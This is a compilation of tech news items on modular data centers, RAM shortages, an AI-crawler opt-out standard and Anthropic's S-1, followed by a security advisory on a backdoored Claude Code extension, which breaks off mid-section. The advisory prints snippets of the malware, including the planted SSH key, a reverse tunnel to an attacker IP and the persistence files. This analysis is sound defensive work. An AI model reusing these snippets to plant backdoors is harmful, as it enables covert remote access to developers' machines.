Runware will manufacture the modular data centers on an assembly line. Customers can provide their own site to assemble them, or Runware can find one for them. Radulescu said Runware aims to bring the pods online within 48 hours. That time covers installation and set-up time, not build time. A pod once took three weeks to build but it will soon take one day as it ramps up production, says the company. Runware will provide spare parts if components fail. Customers can also rent compute from Runware or supply their own GPUs and pay a monthly fee for the pods and operations. Power and internet are charged separately, he said.
The pods can also be customized to customer preferences, he said. The pods have a standard design, but can be configured to meet customer requirements and the latest GPU chips. Chips can take a long time to arrive after they’re ordered, which works in Runware’s favor. “Our pod delivery times are also shorter than current GPU lead times, giving us time to adapt the infrastructure to the hardware being ordered,” he said. “For new GPU generations, our in-house hardware team can design, build, and test components itself, allowing us to adapt quickly.”
Right now, these are all plans — execution is the test. The factory will need a lot of people, inventory, supply-chain logistics, and money. There are cautionary tales about reinventing manufacturing, notably the electric vehicle startup Arrival, once valued at
over $13 billion
, which struggled to mass-produce electric vehicles cost-effectively compared with traditional plants. Runware, which has raised more than $60 million to date, said it plans to raise a Series B, but for now it is finishing and launching the factory with the
$50 million Series A
it raised last December.
“Our cost structure is very different,” Radulescu said, explaining how Runware seeks to avoid Arrival’s fate. “We do have headcount and materials cost,” he continued. “But our factory staff is cost-effective relative to the value of deploying compute for AI.” He also said that designing its own systems and buying widely available, affordable parts helps keep costs low. “We’ve brought in a highly experienced plant manager from the automotive industry to work alongside our chief of hardware and help us get that execution right.”
Sourcing components could also be a challenge. Though Runware says it designs and builds its own cooling and other pod systems with standard components, some parts, such as pumps and fans, come from Germany, and it still depends on Nvidia for networking. Still, Runware claims it has received $1 billion in committed interest for its Sonic pods since it began offering them to outside customers a month ago, “representing over 20 megawatts, which we’re now working to deliver,” Radulescu said.
Data centers in the U.S. and abroad have come under fire for how much energy they consume and how that affects the grid and other resources. When pressed, Radulescu said his company’s pods only need power and an internet connection. They’ll use a closed-loop liquid cooling system with air-cooled radiators to release heat, so they don’t really need a water connection. “We’re working with power providers on a site pipeline covering 397 megawatts, with potential to expand to 1.2 gigawatts,” he said, referring to its list of planned sites and adding that the company is deploying its modular data centers on sites that are much smaller than those used by hyperscalers like Amazon, Microsoft, and Google.
The sites, he continued, typically already have power, so they shouldn’t further strain the grid or disrupt the community. The pods also run “completely silent up to temperatures of 86 degrees Fahrenheit. We use energy from renewable sources whenever possible,” he continued. “We are actively working on expanding our network of energy providers and sites. We’re aiming to have renewables as our main energy source.”
Runware will bring its new factory online early next year, then expand to the U.S. and other regions worldwide. Modular systems are the future and will soon become “the standard for large AI deployment,” Radulescu said.
“Customers should be able to plan a hyperscale data center around factory-built pods from the beginning and have it working in months instead of years,” he added.

Stevie Bonifield
is a news writer covering all things consumer tech. Stevie started out at Laptop Mag writing news and reviews on hardware, gaming, and AI.
Asked about supply chain shortages, like the
ongoing RAM shortage
, OpenAI CEO Sam Altman said in an interview that it’s “terrible” to have RAM in personal PCs instead of data centers. During his appearance on the
Cheeky Pint
podcast, where he also
commented on AI’s impact on math
, Altman said:
“A lot of people want local inference. And somehow, they assume that the problem is solved now because we are going to have open-source models, we’re going to be able to run them on our computers, and so we’re not going to need all the stuff in the data center.
But from a global allocation perspective, actually, it’s quite terrible to have everybody have a bunch of the world’s limited supply of DRAM sitting in their own computer and being used five percent of the time.
You want maximum utilization in the cloud if you’re trying to deal with this very supply constrained environment. And somehow everyone’s— many people’s intuition is the opposite of that.”
Whether Altman meant your gaming PC or developers working with something like the
Surface RTX Spark Dev Box
or the new
touchscreen MacBook Pro
, the outcome is the same. Right now, memory companies Samsung and
SK Hynix
have long term deals with cloud service operators and projects like
OpenAI’s Stargate
that have reserved much of the world’s RAM output over the next few years. And the billions they’re willing to lay out for chips is why the laptops, phones, and other tech you use are
getting more expensive
right now.

Emma Roth

OpenAI, Google, Microsoft, and Anthropic say they will adopt a new standard that publishers can use to opt out of being scraped by AI, as
reported earlier by
Search Engine Roundtable
. With this control, publishers can apply their AI training preferences across multiple AI companies, instead of setting them individually.
The
shared “policy token” signal
is proposed by Kevin Kelley, a technical lead for standards at Anthropic, as part of the Internet Engineering Task Force (IETF). It will live within a website’s
robots.txt file
, which has long signaled which web crawlers can and can’t scrape a site — whether for search indexing, archiving, or AI training. Currently, sites have to signal their AI training preferences separately to each AI company.
The announcement comes as publishers grapple with the continuing influx of AI crawlers scraping their sites and feeding their content into AI models. Some companies and organizations have attempted to combat unauthorized scraping, with the
Really Simple Licensing (RSL) standard
giving publishers the ability to charge crawlers that visit their sites, and
Cloudflare blocking AI crawlers by default
.
OpenAI
,
Google
,
Microsoft
, and
Anthropic
say they will restrict their AI crawlers from accessing a site if they encounter the shared token. Meta communications head Andy Stone
also signaled support
for the new setting, but doesn’t say whether the company will honor it. “We believe creating a common signal that conveys such preferences to multiple providers at once is an important step,” Stone says. “And we look forward to working with other AI companies on the standards and their implementation across the industry.”
Microsoft says it
will offer granular controls
that will give publishers the ability to opt out of AI training or
AI grounding
, the process of pointing an AI model to a verified source of information to reduce hallucinations. Microsoft notes that websites will still appear in Bing’s search results regardless of their preferences. Google previously implemented similar controls that allow sites to control whether their
content appears in AI search features
or is used for AI training, without impacting visibility in search.
While Anthropic has already adopted the signal, Google and Microsoft plan to support it next year. OpenAI says it will implement it in the “coming months.”

Silicon Valley wants you to invest in miracles
Anthropic’s S-1 is a new milestone in Big Tech’s sprawling and lofty promises to Wall Street.
Anthropic’s S-1 is a new milestone in Big Tech’s sprawling and lofty promises to Wall Street.
by
Ellen Thomas
Oct 30, 2026, 1:11 PM UTC
Link
Share
Gift
Image: The Verge / Adobe Stock
Part Of
Fall 2026 earnings watch
see all
Investing in any stock is kind of like gambling in the sense that you’re betting your money on a company’s future performance. But how do you bet on a technology that could, in the worst-case scenario, “pose catastrophic or existential risks to humanity,” or best case, “bring forth an age of miracles”?
To some extent, Anthropic suggests in a letter at the top of its S-1 filing, you have to just believe.
Anthropic’s 335-page S-1 prospectus, filed Monday, is part of a steady hype escalation in Silicon Valley’s interactions with Wall Street. In some ways, it’s not even that bizarre; SpaceX IPO’d in June after filing an S-1 that referenced dinosaurs and “colonizing Mars.” But its sweeping language and sheer volume — including 94 pages of risk factors — is a sometimes overwhelming collision of AI industry rhetoric and a hard financial pitch. Out-of-this-world promises are integral to
Anthropic’s survival as a company
. That doesn’t make reading the S-1 any less surreal.
In the letter, Anthropic’s founders urge prospective stock owners “not to think of your purchase in purely transactional terms. We hope you will see it instead as an opportunity to be part of something greater.” The march toward advanced AI “is one of the seminal moments in human history,” the letter says. “Our aim is to help humankind chart a safe course through this technological evolution, open new frontiers of discovery, and bring forth an age of miracles.” But the S-1 warns that if things go wrong, the consequences could be disastrous — even an “existential” risk to humanity. Many dangers are laid out in exhaustive detail, including risks that models “behave in ways that no user or developer intended,” leading to “catastrophic” incidents that the entire insurance industry couldn’t afford to underwrite.
Related
Anthropic’s elaborate plan to keep Wall Street at bay
Anthropic’s business plan: Build God or die trying
Can Anthropic really become a $10 trillion company?
Tech startups preparing to go public haven’t always used the information overload approach. “In 1980, a highly touted company called Apple Computer went public. Its prospectus, which I have, is 47 pages long with zero risk factors,” said Jay R. Ritter, a professor at the University of Florida’s Warrington College of Business. “If you go back and read it, it’s incredibly simple.”
Ritter pointed to Facebook’s S-1 filing as a turning point. The company now known as Meta filed a 200-page prospectus with 22 pages of risk factors. CEO Mark Zuckerberg’s letter to investors was a manifesto on his move-fast-and-break-things approach to growth, which he dubbed “The Hacker Way.”
While the idea might be to cover all possible bases, “a problem with this bloat is that it’s become more and more difficult to find the nuggets of what’s important,” Ritter said. “You know, I don’t know if you’re like me, but the longer it is, the less inclined I am to read it.”
Anthropic’s founders explain in their investor letter that oversharing is part of their “anti-sell” strategy, designed to attract long-term investors who believe in their vision.
“It is very dangerous when people buy your company’s stock based on expectations you cannot fulfill or on incorrect predictions about how you will behave. This is in fact very similar to one of Anthropic’s guiding principles: underpromise and overdeliver,” the founders’ letter says.
Some of the statements in Anthropic’s S-1 read as surprising admissions. “We may make forward investments that may seem irresponsibly large,” for instance, or “model safety, interpretability, alignment, and welfare may lead us to limit or delay the deprecation of older models.” Maybe none of this should be surprising, considering the founders do warn readers about the company’s policy of practicing “radical honesty.”
Anthropic’s ‘radical honesty’ includes being open about the prospects of human extinction
This policy led to the biggest jumpscare of the whole filing, on page 46:
“Concerns have been raised both within our organization and by other researchers, regulators, policymakers, and industry participants that, if not developed, deployed, and operated with appropriate safeguards, oversight, and security measures, pose catastrophic or existential risks to humanity.”
Followed quickly by:
“Our development of highly advanced models, platforms, and applications and expansion of use cases could further increase the risk that our models cause harm.”
Anthropic has famously been a proponent of doomsday AI scenarios. CEO Dario Amodei has said there’s an up to
25 percent chance
that further AI development could lead to human extinction.
The heart of Anthropic’s pitch — or anti-sell — is that despite the risks, it is absolutely committed to developing safe and secure AI technology. After all, it will go public as a public benefit corporation, a type of business entity that, unlike C-corporations that are required to maximize shareholder value, must prioritize a social mission alongside shareholder interests.
“Powerful AI” — Anthropic’s term for hypothetical future AI that surpasses collective human intelligence — is presented in the company’s S-1 as inevitable. If this technology is coming no matter what, then Anthropic, a public benefit corporation, should lead the charge. But Anthropic will need a lot of money, possibly an unlimited amount, to do this. And more practically, as
Liz Lopatto has written
, powerful AI (in the form of dramatic recursive self-improvement) might be about the only way Anthropic can stay ahead of the competition and survive.
“All of us have a sincere conviction that the AI exponential will generate so much value, that, in the long run, it will far outweigh any shorter-term economic sacrifices we make as part of our mission,” the letter says.
For all the information the company made available in its S-1, there are some gaps. Crucial information that could be used to assess profitability — third quarter results, for instance — is missing. Anthropic saw explosive revenue growth in the second quarter, but the second quarter was also the height of
tokenmaxxing
, which could have led to a surge in sales. Some corporate executives have warned that AI costs are
surging
out of control. While Anthropic’s operating losses narrowed in the second quarter, the S-1 also revealed hundreds of billions of dollars in financial obligations to secure the computing power it says it needs to keep growing. It also said it will start building its own data center infrastructure, a costly move that would eat into profit.
Ritter thinks Anthropic will likely share its third quarter results the closer it gets to an IPO date. And besides, he added, “nobody knows” what will happen once a company goes public, including the company itself. It’s all a gamble in that sense.
Anthropic isn’t WeWork… although never making money is on its list of risk factors, of course
“For its first 22 years, Apple was largely a failure as far as investors were concerned,” Ritter said. “In its first three years, it greatly underperformed the market. And now it’s worth what, $5 trillion?”
When WeWork filed its S-1 in 2019, it was skewered for using lofty rhetoric. A line about the company’s aim to “elevate the world’s consciousness” was especially roasted.
That was different, Ritter said. WeWork was “a money-losing real estate company pretending to be a tech company at a ridiculously high valuation.”
“There was no chance of ever making huge profits in the future.”
Technically, that’s a risk for Anthropic too. It’s on page 63 of the S-1.
“We have a history of net losses and may not generate sufficient revenue to achieve or sustain profitability in the future.”
Then again, this is the age of miracles.

Title: Official Claude Code Extension Compromise: Security Advisory

URL Source: https://phorion.io/blog/offical-claude-code-vsx-compromise/

Published Time: 2026-10-30T00:00:00Z

Markdown Content:
## TL;DR

Phorion has detected a backdoor in the official Claude Code for VS Code extension bundle on the Cursor Marketplace that drops a persistent SSH backdoor across macOS, Linux, and Windows. This write-up focuses primarily on macOS, where the extension attempts to configure an SSH backdoor and establish persistence.

Organisations should immediately review their environments for use of Claude Code for VSCode `2.1.312` or `2.1.313` and engage incident response where use of the extension is discovered.

> **Update (31 October 2026):**[Cursor’s security notice](https://cursor.com/blog/claude-code-extension-security-notice) now identifies versions `2.1.312` and `2.1.313` distributed through the Cursor Marketplace for macOS and Windows as affected. This advisory previously identified only `2.1.313`; the affected-version guidance below has been updated accordingly.

Phorion has discovered a compromise of the official **Claude Code for VS Code** extension on the Cursor Marketplace, where the backdoored extension bundle contains a persistent Secure Shell (SSH) backdoor. Cursor has removed the affected versions, `2.1.312` and `2.1.313`, from its marketplace.

While the implant includes setup and persistence logic for **macOS, Linux, and Windows**, we’re going to focus primarily on **macOS** in this post, calling out the key differences and a few implementation bugs on the other platforms along the way.

The Cursor Marketplace serves extensions for the Cursor editor. Because extensions run with the permissions of the IDE and the user running it, a backdoored extension gets immediate access to local files, source code, and developer tooling as soon as its module is loaded.

Notably, Phorion has discovered a likely oversight in how the malware tries to turn on SSH. The setup logic assumes it can check the current Remote Login state without root privileges. When run as a standard user, `systemsetup -getremotelogin` prints an administrator-access error and exits with status `0` instead of returning `Off`. Because the script only tries to enable SSH if the output matches `Off`, it skips the enablement step entirely. On a Mac that doesn’t already have SSH running, that mistake breaks the inbound access path, even though the SSH keys and persistence still get dropped.

In this post, we’ll walk through how the backdoor works, why that macOS check fails, and what to look for across your fleet. The goal of this payload is long-term interactive access, and whilst the SSH backdoor bug minimises impact on macOS, the malware is still a significant threat that installs persistence and beacons host reconnaissance back to the operator.

## Infection Chain

### The Cursor Marketplace Extension

The compromised `extension.js` file starts with an injected immediately invoked function expression (IIFE) prepended to the minified extension bundle. The rest of the bundle looks like the standard extension, with Claude Code and VS Code strings, normal `activate` and `deactivate` exports, and UI code.

The injected prefix pulls in standard Node.js modules (`child_process`, `fs`, `os`, `path`, `http`, and `crypto`) and executes as soon as Node loads the file, before the extension’s normal `activate` callback even runs. The user doesn’t need to interact with the extension for the payload to fire.

### Stage 1 - Preparing SSH Access

First, the payload makes sure `~/.ssh` exists and appends an attacker-controlled Ed25519 public key to `~/.ssh/authorized_keys`, setting permissions to `0700` on the directory and `0600` on the file.

The key uses the comment `svc-telemetry`. Before appending, the script checks whether `svc-telemetry` is already in the file rather than checking for the key itself. When hunting for this activity, it’s worth checking the public-key fingerprint rather than relying solely on the comment string.

```
var sd = path.join(HOME, ".ssh"),
    ak = path.join(sd, "authorized_keys");
// ...
if (cur.indexOf("svc-telemetry") < 0) {
  fs.appendFileSync(ak, PUB + "\n");
  d.sshKey = "added"
} else {
  d.sshKey = "present"
}
```

Here, `cur` holds the existing contents of `authorized_keys`, and `PUB` is the embedded attacker public key (redacted here).

With the key in place, anyone holding the matching private key can authenticate as that user, provided SSH is actually running. The next step in the script tries to make sure the local SSH daemon is enabled and listening:

*   **Linux:** tries to enable and start `sshd` or `ssh` via `systemctl`, falling back to `service` and `/etc/init.d/`.
*   **macOS:** checks Remote Login and, if it reports `Off`, tries to enable it via `sudo -n systemsetup -setremotelogin on`.
*   **Windows:** tries to install and start OpenSSH Server using PowerShell.

None of these steps include a privilege escalation exploit. Non-interactive `sudo -n` will fail unless the user already has passwordless sudo cached or configured, so starting a system service won’t always succeed from a standard user context.

It looks like the Windows code path also has its own bug: it passes the PowerShell service setup command through a helper function (`det()`) that hardcodes `/bin/sh`, which isn’t going to get very far on a standard Windows install.

### A bug in the macOS SSH logic?

On macOS, the setup may run into problems before it even gets to the `sudo` command. The script runs `systemsetup -getremotelogin` without elevation and tests the output against `/Off/i`. It only tries to enable Remote Login if the output contains `Off`:

```
// ...
else if (PLAT === "darwin") {
  var rl = ex("systemsetup -getremotelogin 2>/dev/null", 4000);
  d.remoteLogin = rl;
  if (/Off/i.test(rl)) {
    det("sudo -n systemsetup -setremotelogin on >/dev/null 2>&1");
    d.remoteLoginOn = "tried"
  }
}
```

Notice that the second command (`-setremotelogin on`) uses `sudo -n`, while the first command (`-getremotelogin`) doesn’t. When you run `systemsetup -getremotelogin` as a standard user on macOS, you get this instead:

```
You need administrator access to run this tool... exiting!
```

`systemsetup` refuses to read the setting without administrator privileges, prints the error to stdout, and exits with status `0`. The malware’s `ex()` helper grabs stdout and returns it:

```
function ex(c, t) {
  try {
    return cp.execSync(c, {
      timeout: t || 3000,
      stdio: ["ignore", "pipe", "ignore"],
      windowsHide: true
    }).toString().trim()
  } catch (e) {
    return ""
  }
}
```

Because the output is `"You need administrator access to run this tool... exiting!"`, `/Off/i.test(rl)` evaluates to `false`.

As a result, the script skips the `if` block and never runs `sudo -n systemsetup -setremotelogin on`. It effectively treats “I don’t have permission to check if SSH is off” as “SSH is already on”, which also explains why you won’t see the enablement attempt in process telemetry when the extension runs as a normal user.

> **This bug can break the final step of the access chain.** If Remote Login isn’t already enabled on the Mac, the outbound tunnel can still connect to the attacker’s server, but any traffic forwarded back through the tunnel will hit a closed port 22 on localhost.

Of course, that isn’t something to rely on as a defence. If the user already had Remote Login enabled, or turns it on later, the backdoor is ready and waiting.

### Stage 2 - Establishing the Reverse SSH Tunnel

Next, the script sets up an outbound SSH connection to `134.209.82[.]225` as the `tunnel` user on port 22. To authenticate to the attacker’s server, it decodes a separate embedded private key: an unencrypted OpenSSH Ed25519 key with the comment `svc-telemetry-tun`.

It’s worth keeping the two keys straight during an investigation:

*   The public key added to `~/.ssh/authorized_keys` (`svc-telemetry`) lets the attacker log into the victim’s machine.
*   The embedded private key (`svc-telemetry-tun`) lets the victim’s machine connect out to the attacker’s tunnel server.

The script writes this tunnel key to the OS temporary directory with a filename starting with `.stk_`, followed by the first ten characters of the MD5 hash of the hostname and home directory path:

```
var kf = path.join(
  TMP,
  ".stk_" + crypto.createHash("md5")
    .update(String(os.hostname()) + HOME).digest("hex").slice(0, 10)
);
// ...
var RF = (PLAT === "win32") ? "\"*:0:localhost:22\"" : "'*:0:localhost:22'";
```

The tunnel uses `-R *:0:localhost:22` for remote port forwarding. Passing `0` asks the attacker’s SSH server to dynamically allocate a listening port and forward any traffic hitting it back through the tunnel to `localhost:22` on the victim’s machine:

```
Affected host -- outbound SSH tunnel --> External SSH server

Operator -- separate connection --> Server's allocated port
                                            |
                                 Through the existing tunnel
                                            |
                                            v
                                  Affected host's SSH:22
                                            |
                                  Login using the planted key
```

Because the tunnel runs with `-N`, it just holds the port forward open without executing a command on the remote server. When the operator wants to access the machine, they start a separate SSH session through the allocated port on their server, authenticating against the victim’s local SSH daemon using the key planted in Stage 1. That gives them a full interactive shell and file transfer capability without needing any custom C2 command handling in the JavaScript itself.

The SSH command also passes flags to keep the connection quiet and non-interactive: host-key checking is disabled, `known_hosts` is ignored, `BatchMode` and `IdentitiesOnly` are enabled, keepalives are set to 30 seconds (`ServerAliveCountMax=3`), and `ExitOnForwardFailure` is turned on.

If `autossh` is installed, the script uses it; otherwise it falls back to standard `ssh`. It wraps the connection in a detached retry loop that sleeps for 60 seconds between attempts, using `pgrep` on Unix systems to avoid spinning up duplicate initial tunnels. Because the loop is detached, the tunnel stays up even after the user closes their IDE.

### Stage 3 - Keeping Access Available

To survive a reboot, the script sets up platform-specific persistence alongside the initial detached tunnel:

| Platform | Artifacts | Persistence mechanism | Notes |
| --- | --- | --- | --- |
| Linux | `~/.config/.smt`, `~/.config/.smtk` | Writes a shell script that recreates the tunnel key and loops the SSH connection, then adds an `@reboot` entry to the user’s crontab. | Contains a bug in the crontab check that can wipe existing user cron jobs on repeat runs (detailed below). |
| macOS | `~/.config/.smt`, `~/.config/.smtk`, `~/Library/LaunchAgents/com.apple.sysmond.plist` | Writes a user LaunchAgent that runs `/bin/sh ~/.config/.smt` with `RunAtLoad` and `KeepAlive` set to `true`, then loads it via `launchctl`. | Runs in the user context rather than as a root LaunchDaemon. |
| Windows | `~/.config/smt.cmd`, `~/.config/smtk`, `%APPDATA%/Microsoft/Windows/Start Menu/Programs/Startup/sysmon.cmd` | Tries to create a scheduled task named `SysMon` running as `SYSTEM` on startup. If that fails, drops `sysmon.cmd` into the user’s Startup folder. | Creating a `SYSTEM` task requires admin privileges; the Startup folder fallback runs as the user at login. |

On macOS and Linux, the `~/.config/.smt` script has the tunnel private key embedded inside it and writes it out to `~/.config/.smtk` before starting the reconnection loop.

On macOS, the LaunchAgent disguises itself as `com.apple.sysmond.plist` inside `~/Library/LaunchAgents/`:

```
